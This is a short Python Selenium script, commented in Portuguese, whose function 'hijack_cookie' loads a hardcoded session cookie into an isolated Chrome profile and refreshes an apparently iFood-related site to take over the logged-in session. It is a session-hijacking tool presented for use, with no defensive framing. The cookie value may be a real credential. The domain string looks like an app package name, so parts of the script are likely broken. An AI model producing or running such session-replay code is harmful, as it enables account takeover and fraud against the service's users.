from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def hijack_cookie():
    cookie_value = "stbqrla7adjP8uUHVitWkbla1BFkO7tLgT4B6o1QrJ_lweVguILkdkwCj0bW_wK6B9ot-TgRYr9eXRFs_VXYHQ9w=="  # seu cookie
    domain = ".br.com.brainweb.ifood"  # dominio do cookie
    url_to_open = "https://br.com.brainweb.ifood"  # URL pra validar a sessão

    chrome_options = Options()
    chrome_options.add_argument("--user-data-dir=C:/Temp/ChromeProfile")  # Perfil isolado, pra não sujar seu navegador
    driver = webdriver.Chrome(options=chrome_options)

    driver.get("https://" + domain.replace('.', '', 1))  # Acessa o site para conseguir injetar o cookie
    driver.add_cookie({
        'name': 'iFood',  # O nome do cookie (ex: session, token, etc) — pode precisar ajustar!
        'value': cookie_value,
        'domain': domain,
        'path': '/',
    })
    driver.refresh()

if __name__ == "__main__":
    hijack_cookie()
